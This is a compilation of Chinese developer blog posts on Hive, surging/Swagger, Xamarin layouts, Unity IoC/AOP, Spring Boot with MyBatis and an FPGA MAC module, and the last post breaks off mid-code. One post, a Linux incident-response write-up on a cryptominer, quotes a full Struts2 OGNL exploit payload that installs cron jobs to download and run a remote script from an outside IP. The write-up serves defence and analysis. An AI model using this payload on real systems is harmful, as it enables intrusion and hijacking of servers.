18/10/07 02:37:11 WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable
Found 1 items
-rwxr-xr-x   3 root supergroup         38 2018-10-07 02:24 /user/hive/warehouse/bigdata17.db/load_data_local/load_data_local.txt
从HDFS中导入数据
在Hive中创建load_data_hdfs表，表中有两个字段，分别是name和age。创建表的SQL如下：
create table if not exists load_data_hdfs(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
在本地文件系统创建文件load_data_hdfs.txt文件，然后往里面写入数据。
将load_data_hdfs.txt文件上传到HDFS的data目录下面，命令为：hadoop fs -put load_data_hdfs.txt /data
在Hive中执行命令：
load data inpath 'data/load_data_hdfs.txt' into table load_data_hdfs;
即可将数据导入到Hive的load_data_hdfs表中。
从本地系统导入数据和从hdfs文件系统导入数据用的命令都是load data，但是从本地系统导入数据要加local关键字，如果不加则是从hdfs文件系统导入数据。
从hdfs文件系统导入数据成功后，会把hdfs文件系统中的load_data_hdfs.txt文件删除掉。
从其他的Hive表中导入数据
这种方式要求目标表和源表都必须存在。
创建一个要导入数据的目标表，SQL如下：
create table if not exists load_data_local2(name string,age int) 
row format delimited fields terminated by ' '  
lines terminated by '\n';
导入数据的SQL：
insert into table load_data_local2 select * from load_data_local;
这种数据导入方式也适用于分区表和分桶表的情况。本文只介绍导入分区表的情况，导入数据到分区表分为静态分区和动态分区两种方式。
我们先创建一个分区表，SQL如下：
create table if not exists load_data_partition(name string)  
partitioned by(age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
将数据导入分区表必须先在Hive中执行下面两句语句：
set hive.exec.dynamic.partition=true;
set hive.exec.dynamic.partition.mode=nonstrict;
静态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：
insert into table load_data_partition partition(age=25) select name from load_data_local;
这种方式必须显示的指定分区值，如果分区有很多值，则必须执行多条SQL，效率低下。
动态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：
insert overwrite table load_data_partition partition select name,age from load_data_local;
这种方式要注意目标表的字段必须和select查询语句字段的顺序和类型一致，特别是分区字段的类型要一致，否则会报错。
一张表有两个以上的分区字段，如果同时使用静态分区和动态分区导入数据，静态分区字段必须写在动态分区字段之前。
Hive还支持一条SQL语句中将数据插入多个表的功能，只需将from关键字前置即可：
from load_data_local 
insert overwrite table load_data_partition partition (age)
  select name,age
insert overwrite table load_data_local3 
  select *
上面的sql语句同时插入到表load_data_partition和load_data_local3表中。这种方式非常高效，对于大数据量并且要将数据插入到多个表的情况下，建议用这种方式。
创建表的同时导入数据
这种方式的创建表的表结构来自于select查询语句的查询字段。
创建load_data_local3并将load_data_loaca的数据导入到load_data_local3表中：
create table load_data_local3 as select * from load_data_local;

********************************************************************************************************************************************************************************************************
surging如何使用swagger 组件测试业务模块
1、前言
   微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有太明确的定义，但是我认为服务应该是一个或者一组相对较小且独立的功能单元，可以自由组合拆分，针对于业务模块的 CRUD 可以注册为服务，而每个服务都是高度自治的，从开发，部署都是独立，而每个服务只做单一功能，利用领域驱动设计去更好的拆分成粒度更小的模块，而框架本身提供了多种协议，如ws,tcp,http,mqtt,rtp,rtcp, 并且有各种功能的中间件，所开发的业务模块，通过框架可以适用于各种业务场景，让开发人员专注于业务开发这才是真正意义上的微服务。
 以上只是谈下微服务，避免一些人走向误区。而这篇文章主要介绍下surging如何使用swagger 组件测试业务模块
surging源码下载
2、如何使用swagger
 
surging 集成了Kestrel组件并且扩展swagger组件，以下介绍下如何使用swagger组件
xml文档文件设置
针对于 swagger 需要生成 schema，那么需要加载接口模块的xml文档文件，可以通过项目-属性-生成-xml文档文件 进行设置，如下图所示

通过以上设置，如果扫描加载业务模块，可以使用dotnet publish -c release 生成模块文件，如下图所示
 
文件配置
使用swagger ，如果使用官方提供的surging 引擎的话，就需要开启Kestrel组件，如以下配置所示

  "Surging": {
    "Ip": "${Surging_Server_IP}|127.0.0.1",
    "WatchInterval": 30,
    "Port": "${Surging_Server_Port}|98",
    "MappingIp": "${Mapping_ip}",
    "MappingPort": "${Mapping_Port}",
    "Token": "true",
    "MaxConcurrentRequests": 20,
    "ExecutionTimeoutInMilliseconds": 30000,
    "Protocol": "${Protocol}|None", //Http、Tcp、None
    "RootPath": "${RootPath}|D:\\userapp",
    "Ports": {
      "HttpPort": "${HttpPort}|280",
      "WSPort": "${WSPort}|96"
    },
    "RequestCacheEnabled": false,
    "Packages": [
      {
        "TypeName": "EnginePartModule",
        "Using": "${UseEngineParts}|DotNettyModule;NLogModule;MessagePackModule;ConsulModule;KestrelHttpModule;WSProtocolModule;EventBusRabbitMQModule;CachingModule;"
      }
    ]
  }

以下是配置swagger，如果不添加以下配置，可以禁用swagger

  "Swagger": {
    "Version": "${SwaggerVersion}|V1", // "127.0.0.1:8500",
    "Title": "${SwaggerTitle}|Surging Demo",
    "Description": "${SwaggerDes}|surging demo",
    "Contact": {
      "Name": "API Support",
      "Url": "https://github.com/dotnetcore/surging",
      "Email": "fanliang1@hotmail.com"
    },
    "License": {
      "Name": "MIT",
      "Url": "https://github.com/dotnetcore/surging/blob/master/LICENSE"
    }
  }


 
 通过以上设置，就可以通过http://127.0.0.1:280/swagger进行访问，效果如下图所示

测试上传文件

测试下载文件

 Post 测试

GET 测试
 
五、总结
通过swagger 引擎组件能够生成业务接口文档，能够更好的和团队进行协作，而surging计划是去网关中心化，会扩展'关卡(stage)'引擎组件以代替网关，同时也会扩展更多的通信协议，也欢迎大家扩展引擎组件，让生态更强大。
 
********************************************************************************************************************************************************************************************************
Linux应急响应（三）：挖矿病毒
0x00 前言
​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。
0x01 应急场景
​ 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：


0x02 事件分析
A、排查过程
登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :




下载logo.jpg，包含脚本内容如下：


到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？
通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。


B、溯源分析
​ 在Tomcat log日志中，我们找到这样一条记录：


对日志中攻击源码进行摘录如下： 
{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。
C、清除病毒
1、删除定时任务:

2、终止异常进程:


D、漏洞修复
​ 升级struts到最新版本 
0x03 防范措施
​ 针对服务器被感染挖矿程序的现象，总结了几种预防措施：
1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护2、及时更新 Windows安全补丁，开启防火墙临时关闭端口3、及时更新web漏洞补丁，升级web组件
 
关于我：一个网络安全爱好者，致力于分享原创高质量干货，欢迎关注我的个人微信公众号：Bypass--，浏览更多精彩文章。

********************************************************************************************************************************************************************************************************
xamarin forms常用的布局stacklayout详解

通过这篇文章你将了解到xamarin forms中最简单常用的布局StackLayout。至于其他几种布局使用起来，效果相对较差，目前在项目中使用最多的也就是这两种布局StackLayout和Grid。


之前上一家的的同事在写xamarin android的时候，聊天给我说他写axml布局的时候都是拖控件，这有点刷新我认知的下线，一直拖控件“历史原因”，造成的坏处是显而易见的，无法熟练掌握布局的常用属性，至于xamarin forms能不能拖控件，就目前来说是不能的，布局的设计有两种实现方式，一种是以c#代码的方式，一种是以xaml布局的方式。

如下图是xamarin forms中最见的五种布局，本篇文章将使用最常用的一种布局StackLayout，实现一个简易计算器的布局，便于熟悉和掌握这种布局的各种属性。

StackLayout相似于android中LinearLayout、前端css中的默认的Static定位；Grid相似于android中GridLayout，html中的Table布局。
1.StackLayout布局属性和属性值的作用
顾名思义，StackLayout是一种可以在上下方向、左右方向堆叠的布局，简单而又常用的布局，我们需要掌握它的三个重要属性，最重要的是布局方向和布局定位。

Orientation :布局方向，枚举类型，表示StackLayout以哪种方向的布局， Vertical (垂直方向布局) 和
Horizontal（水平方向布局）,默认值是Vertical.
Spacing :double类型，表示每个子视图之间的间隙, 默认值 6.0.
VerticalOptions和HorizontalOptions：布局定位（既可以定位又可以设置布局元素大小），该属性的属性值有8个分别是

Start：在父布局开始位置
Center：在父布局中间位置
End：在父布局最后位置
Fill：填充整个父布局的位置
StartAndExpand、CenterAndExpand、EndAndExpand、FillAndExpand，这种带AndExpand的作用就是：根据其他布局的内容大小，如果有空白位置就会自动填充。当多个属性值都是AndExpand则会平分空白部分。
直接来个布局看看这些个属性到底是怎么用的吧



<?xml version="1.0" encoding="utf-8" ?>
<ContentPage xmlns="http://xamarin.com/schemas/2014/forms"
             xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
             xmlns:local="clr-namespace:XamarinFormsLayout"
             x:Class="XamarinFormsLayout.MainPage">
    <StackLayout Orientation="Vertical">
        <StackLayout Orientation="Vertical" BackgroundColor="Accent" VerticalOptions="FillAndExpand" Padding="10">
            <Label Text="我在左边" 
           HeightRequest="100"
           WidthRequest="200"
           HorizontalOptions="Start"
           VerticalOptions="Start"
           BackgroundColor="AliceBlue"
           TextColor="Black"
           VerticalTextAlignment="Center"/>
            <Label Text="我在右边" 
           HorizontalOptions="End"
           VerticalOptions="End"
           BackgroundColor="AliceBlue"
           TextColor="Black"
           VerticalTextAlignment="Center"/>
        </StackLayout>
        <StackLayout Orientation="Horizontal" BackgroundColor="Aquamarine" VerticalOptions="Start" HeightRequest="50">
            <Label HorizontalOptions="Start" VerticalOptions="CenterAndExpand"  Text="我在左边" TextColor="Black" BackgroundColor="Azure"></Label>
            <Label HorizontalOptions="FillAndExpand" VerticalOptions="CenterAndExpand"  Text="占满中间位置" TextColor="Black" BackgroundColor="Azure"></Label>
            <Label HorizontalOptions="End" VerticalOptions="CenterAndExpand"  Text="我在右边" TextColor="Black" BackgroundColor="Azure"></Label>
        </StackLayout>
        <StackLayout Orientation="Vertical" BackgroundColor="Accent"  Padding="10"  VerticalOptions="FillAndExpand">
            <!-- Place new controls here -->
            <Label Text="我在顶部,高度平分" 
              HorizontalOptions="StartAndExpand"
              VerticalOptions="FillAndExpand"
              BackgroundColor="Red"/>
            <Label Text="我在中间，高度平分" 
              HorizontalOptions="FillAndExpand"
              VerticalOptions="FillAndExpand"
              BackgroundColor="Red"/>
            <Label Text="我在底部" 
              HorizontalOptions="FillAndExpand"
              VerticalOptions="EndAndExpand"
              BackgroundColor="Red"/>
        </StackLayout>
    </StackLayout>
</ContentPage>
直接设置高度宽度可以用HeightRequest和WidthRequest；
2.StackLayout布局重点需要掌握
2.1 VerticalOptions和HorizontalOptions与WidthRequest和HeightRequest的优先级关系是什么？
这一点容易混淆，我们已经知道VerticalOptions和HorizontalOptions是用来定位和设置大小的，WidthRequest和HeightRequest是double类型，只能用来设置控件大小。当都设置了这四个属性，会出现什么样的结果。

里面两个子StackLayout的高度各占50%，我们发现** Options和**Request 的属性值所定义的大小谁大就以谁的值为主。
2.2 在垂直方向（水平方向）设置宽度WidthRequest（高度HeightRequest）无效，如图：

3.StackLayout实现一个简易的计算器布局

代码如下：
<?xml version="1.0" encoding="utf-8" ?>
<ContentPage xmlns="http://xamarin.com/schemas/2014/forms"
             xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
             x:Class="XamarinFormsLayout.CalculatorPage"
             BackgroundColor="#808080">
    <ContentPage.Resources>
        <ResourceDictionary>
            <Style x:Key="DefaultButton" TargetType="Button">
                <Setter Property="BackgroundColor" Value="Black"></Setter>
                <Setter Property="TextColor" Value="#dedede"></Setter>
            </Style>
        </ResourceDictionary>
    </ContentPage.Resources>
    <StackLayout Orientation="Vertical"  Spacing="10" VerticalOptions="End" Padding="10">
        <Frame BackgroundColor="White" HeightRequest="40" Margin="0,0,0,20">
            <Label Text="0" VerticalOptions="Center" HorizontalOptions="End"TextColor="Black"FontSize="35"/>
        </Frame>
        <StackLayout Orientation="Vertical">
            <StackLayout Orientation="Horizontal"   Spacing="10">
                <StackLayout Orientation="Vertical" HorizontalOptions="FillAndExpand">
                    <Button  Text="清除" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"   Text="7"  Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="8" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="9" Style="{StaticResource DefaultButton}" />
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"  Text="4" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="5" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="6" Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"   Text="1" Style="{StaticResource DefaultButton}" />
                        <Button HorizontalOptions="FillAndExpand"  Text="2" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"   Text="3" Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                    <StackLayout Orientation="Horizontal" HeightRequest="60">
                        <Button HorizontalOptions="FillAndExpand"  Text="0" Style="{StaticResource DefaultButton}"/>
                        <Button HorizontalOptions="FillAndExpand"  Text="." Style="{StaticResource DefaultButton}"/>
                    </StackLayout>
                </StackLayout>
                <StackLayout Orientation="Vertical" WidthRequest="60">
                    <Button  Text="÷"  HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="*" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="+" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="-" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                    <Button Text="=" HeightRequest="60" Style="{StaticResource DefaultButton}"/>
                </StackLayout>
            </StackLayout>
        </StackLayout>
    </StackLayout>
</ContentPage>
4.总结
xamarin forms的布局都是基于wpf的思想，padding和margin的四个方向是左上右下，这和android、前端css的四个方向上右下左有点区别。
常用的布局就我个人而言StackLayout和Grid使用的最为广泛和简单，其他的几种布局写起来相对复杂，效果也相对不佳。

********************************************************************************************************************************************************************************************************
IOC的理解,整合AOP,解耦对Service层和Dal层的依赖
 DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖依赖抽象，而不是细节 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方 高层本来是依赖低层，但是可以通过工厂(容器)来决定细节，去掉了对低层的依赖 IOC控制反转：把高层对低层的依赖，转移到第三方决定，避免高层对低层的直接依赖(是一种目的)那么程序架构就具备良好扩展性和稳定性DI依赖注入：是用来实现IOC的一种手段, 在构造对象时，可以自动的去初始化，对象需要的对象构造函数注入  属性注入   方法注入,IOC容器初始化ApplePhone的时候 通过配置文件实例化 属性,方法,构造函数

using Microsoft.Practices.Unity;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Ruanmou.Interface;
using System;
using Unity.Attributes;

namespace Ruanmou.Service
{
    public class ApplePhone : IPhone
    {
        [Dependency]//属性注入：不错，但是有对容器的依赖
        public IMicrophone iMicrophone { get; set; }
        public IHeadphone iHeadphone { get; set; }
        public IPower iPower { get; set; }

        //[InjectionConstructor]
        public ApplePhone()
        {
            Console.WriteLine("{0}构造函数", this.GetType().Name);
        }

        //[InjectionConstructor]//构造函数注入：最好的，默认找参数最多的构造函数
        public ApplePhone(IHeadphone headphone)
        {
            this.iHeadphone = headphone;
            Console.WriteLine("{0}带参数构造函数", this.GetType().Name);
        }

        public void Call()
        {
            Console.WriteLine("{0}打电话", this.GetType().Name); 
        }

        [InjectionMethod]//方法注入：最不好的，增加一个没有意义的方法，破坏封装
        public void Init1234(IPower power)
        {
            this.iPower = power;
        }
    }
}

 
不管是构造对象，还是注入对象，这里都是靠反射做到的
有了依赖注入，才可能做到无限层级的依赖抽象，才能做到控制反转
 
IOC Unity容器 可以通过代码注册或配置文件注册接口对应实现类,实现了不依赖具体,可以对对象全局单例,线程单例
例子1
Service业务逻辑层升级,在原有1.0的基础上添加一些功能,使用配置文件注册

      <container name="testContainer1">
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.ApplePhone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL"/>
      </container>

      <container name="testContainer">
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL"/>
      </container>

只需要把服务2.0的类库(实现1.0的原有接口)dll拿过来即可使用,代码不做任何修改
例子2 业务扩展，新加功能
应该是加几个接口和实现类的映射,就可以解决了。
例子3 实现AOP
方法需要加日志，加异常管理，可以不修改原有代码，直接新加异常管理类等的类库，在Unity配置文件添加AOP配置节点即可实现

配置文件配置，

      <container name="testContainerAOP">
        <extension type="Interception"/>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend">
          <interceptor type="InterfaceInterceptor"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.AuthorizeBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.SmsBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.ExceptionLoggingBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.CachingBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.LogBeforeBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.ParameterCheckBehavior, Ruanmou.Framework"/>
          <interceptionBehavior type="Ruanmou.Framework.AOP.LogAfterBehavior, Ruanmou.Framework"/>
        </register>
        <register type="Ruanmou.Interface.IPhone,Ruanmou.Interface" mapTo="Ruanmou.Service.AndroidPhone, Ruanmou.Service.Extend" name="Android"/>
        <register type="Ruanmou.Interface.IMicrophone, Ruanmou.Interface" mapTo="Ruanmou.Service.Microphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IHeadphone, Ruanmou.Interface" mapTo="Ruanmou.Service.Headphone, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.Interface.IPower, Ruanmou.Interface" mapTo="Ruanmou.Service.Power, Ruanmou.Service.Extend"/>
        <register type="Ruanmou.IDAL.IBaseDAL, Ruanmou.IDAL" mapTo="Ruamou.DAL.BaseDAL, Ruamou.DAL">
        </register>
      </container>

 贴一个异常处理的AOP例子代码

namespace Ruanmou.Framework.AOP
{
    public class ExceptionLoggingBehavior : IInterceptionBehavior
    {
        public IEnumerable<Type> GetRequiredInterfaces()
        {
            return Type.EmptyTypes;
        }

        public IMethodReturn Invoke(IMethodInvocation input, GetNextInterceptionBehaviorDelegate getNext)
        {
            IMethodReturn methodReturn = getNext()(input, getNext);

            Console.WriteLine("ExceptionLoggingBehavior");
            if (methodReturn.Exception == null)
            {
                Console.WriteLine("无异常");
            }
            else
            {
                Console.WriteLine($"异常:{methodReturn.Exception.Message}");
            }
            return methodReturn;
        }

        public bool WillExecute
        {
            get { return true; }
        }
    }
}

 
例子4 数据访问层的替换，因为已经不依赖具体实现，把配置文件的接口对应的数据访问层实现类替换即可，配置文件格式为InterFace Map 实现类
数据访问层的封装公共增删改查，Unity 管理 EF DBcontext，保持全局或线程单例还没有看到，最近在学内存管理和.Net垃圾回收
 
********************************************************************************************************************************************************************************************************
详解intellij idea搭建SpringBoot


Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。


vSpring Boot概念
从最根本上来讲，Spring Boot就是一些库的集合，它能够被任意项目的构建系统所使用。简便起见，该框架也提供了命令行界面，它可以用来运行和测试Boot应用。框架的发布版本，包括集成的CLI（命令行界面），可以在Spring仓库中手动下载和安装。

创建独立的Spring应用程序
嵌入的Tomcat，无需部署WAR文件
简化Maven配置
自动配置Spring
提供生产就绪型功能，如指标，健康检查和外部配置
绝对没有代码生成并且对XML也没有配置要求

v搭建Spring Boot
1. 生成模板
可以在官网https://start.spring.io/生成spring boot的模板。如下图

然后用idea导入生成的模板,导入有疑问的可以看我另外一篇文章

 
2. 创建Controller

3. 运行项目
添加注解 @ComponentScan(注解详情点这里) 然后运行

在看到"Compilation completed successfully in 3s 676ms"消息之后，打开任意浏览器，输入 http://localhost:8080/index 即可查看效果，如下图

 
4. 接入mybatis
MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。
在项目对象模型pom.xml中插入mybatis的配置

<dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>1.1.1</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.30</version>
        </dependency>

创建数据库以及user表

use zuche;
CREATE TABLE `users` (
    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
    `username` varchar(255) NOT NULL,
    `age` int(10) NOT NULL,
    `phone` bigint NOT NULL,
    `email` varchar(255) NOT NULL,
    PRIMARY KEY (`id`)
)ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
insert into users values(1,'赵',23,158,'3658561548@qq.com');
insert into users values(2,'钱',27,136,'3658561548@126.com');
insert into users values(3,'孙',31,159,'3658561548@163.com');
insert into users values(4,'李',35,130,'3658561548@sina.com'

分别创建三个包，分别是dao/pojo/service, 目录如下

添加User：


package com.athm.pojo;

/**
 * Created by toutou on 2018/9/15.
 */
public class User {
    private int id;
    private String username;
    private Integer age;
    private Integer phone;
    private String email;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public Integer getPhone() {
        return phone;
    }

    public void setPhone(Integer phone) {
        this.phone = phone;
    }

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }
}

View Code
添加UserMapper：


package com.athm.dao;

import com.athm.pojo.User;
import org.apache.ibatis.annotations.Mapper;
import org.apache.ibatis.annotations.Select;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
@Mapper
public interface UserMapper {
    @Select("SELECT id,username,age,phone,email FROM USERS WHERE AGE=#{age}")
    List<User> getUser(int age);
}

View Code
添加UserService：


package com.athm.service;

import com.athm.pojo.User;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
public interface UserService {
    List<User> getUser(int age);
}

View Code
添加UserServiceImpl


package com.athm.service;

import com.athm.dao.UserMapper;
import com.athm.pojo.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

/**
 * Created by toutou on 2018/9/15.
 */
@Service
public class UserServiceImpl implements UserService{
    @Autowired
    UserMapper userMapper;

    @Override
    public List<User> getUser(int age){
        return userMapper.getUser(age);
    }
}

View Code
controller添加API方法


package com.athm.controller;

import com.athm.pojo.User;
import com.athm.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by toutou on 2018/9/15.
 */
@RestController
public class IndexController {
    @Autowired
    UserService userService;
    @GetMapping("/show")
    public List<User> getUser(int age){
        return userService.getUser(age);
    }

    @RequestMapping("/index")
    public Map<String, String> Index(){
        Map map = new HashMap<String, String>();
        map.put("北京","北方城市");
        map.put("深圳","南方城市");
        return map;
    }
}

View Code
修改租车ZucheApplication


package com.athm.zuche;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.ComponentScan;

@SpringBootApplication
@ComponentScan(basePackages = {"com.athm.controller","com.athm.service"})
@MapperScan(basePackages = {"com.athm.dao"})
public class ZucheApplication {

    public static void main(String[] args) {
        SpringApplication.run(ZucheApplication.class, args);
    }
}

View Code
添加数据库连接相关配置，application.properties

spring.datasource.url=jdbc:mysql://localhost:3306/zuche
spring.datasource.username=toutou
spring.datasource.password=*******
spring.datasource.driver-class-name=com.mysql.jdbc.Driver

按如下提示运行

浏览器输入得到效果：

vgithub地址
https://github.com/toutouge/javademo/tree/master/zuche_test/zuche
v博客总结

系统故障常常都是不可预测且难以避免的，因此作为系统设计师的我们，必须要提前预设各种措施，以应对随时可能的系统风险。


 
        作　　者：请叫我头头哥
        
        出　　处：http://www.cnblogs.com/toutou/
        
        关于作者：专注于基础平台的项目开发。如有问题或建议，请多多赐教！
        
        版权声明：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。
        
        特此声明：所有评论和私信都会在第一时间回复。也欢迎园子的大大们指正错误，共同进步。或者直接私信我
        
        声援博主：如果您觉得文章对您有帮助，可以点击文章右下角【推荐】一下。您的鼓励是作者坚持原创和持续写作的最大动力！
        
    








<!--
#comment_body_3242240 {
        display: none;
    }
-->
********************************************************************************************************************************************************************************************************
FPGA设计千兆以太网MAC（3）——数据缓存及位宽转换模块设计与验证
　　本文设计思想采用明德扬至简设计法。上一篇博文中定制了自定义MAC IP的结构，在用户侧需要位宽转换及数据缓存。本文以TX方向为例，设计并验证发送缓存模块。这里定义该模块可缓存4个最大长度数据包，用户根据需求改动即可。
　　该模块核心是利用异步FIFO进行跨时钟域处理，位宽转换由VerilogHDL实现。需要注意的是用户数据包位宽32bit，因此包尾可能有无效字节，而转换为8bit位宽数据帧后是要丢弃无效字节的。内部逻辑非常简单，直接上代码：


  1 `timescale 1ns / 1ps
  2 
  3 // Description: MAC IP TX方向用户数据缓存及位宽转换模块
  4 // 整体功能：将TX方向用户32bit位宽的数据包转换成8bit位宽数据包
  5 //用户侧时钟100MHZ，MAC侧125MHZ
  6 //缓存深度：保证能缓存4个最长数据包，TX方向用户数据包包括
  7 //目的MAC地址  源MAC地址 类型/长度 数据 最长1514byte
  8 
  9 
 10 module tx_buffer#(parameter DATA_W = 32)//位宽不能改动
 11 (
 12     
 13     //全局信号
 14     input                         rst_n,//保证拉低三个时钟周期，否则FIF可能不会正确复位
 15 
 16     //用户侧信号
